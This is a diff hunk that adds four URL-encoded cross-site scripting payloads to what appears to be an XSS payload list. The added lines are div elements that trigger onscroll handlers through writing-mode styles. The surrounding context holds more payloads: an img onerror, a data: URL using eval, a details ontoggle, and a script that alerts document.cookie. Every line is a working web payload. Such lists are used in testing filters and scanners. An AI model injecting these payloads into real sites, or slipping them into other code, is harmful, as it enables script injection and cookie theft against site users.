@@ -1219,3 +1219,7 @@ x”</title><img src%3dx onerror%3dconfirm(1)>
 data:html=1;alert(1)/*,<body%20onload=eval(location.href)><title>*/;alert(2)}
 <details open ontoggle="alert(1)">
 <script>for(var i=0;i>=0;i++){alert(Math.random()); alert(document.cookie);}</script>
+%3Cdiv%20style=writing-mode:vertical-rl%3Boverflow:scroll%20onscroll=alert(1)%3E
+%3Cdiv%20style=writing-mode:tb%3Boverflow:scroll%20onscroll=alert(1)%3E
+%3Cdiv%20style=writing-mode:tb-rl%3Boverflow:scroll%20onscroll=alert(1)%3E
+%3Cdiv%20style=-webkit-writing-mode:vertical-rl%3Boverflow:scroll%20onscroll=alert(1)%3E
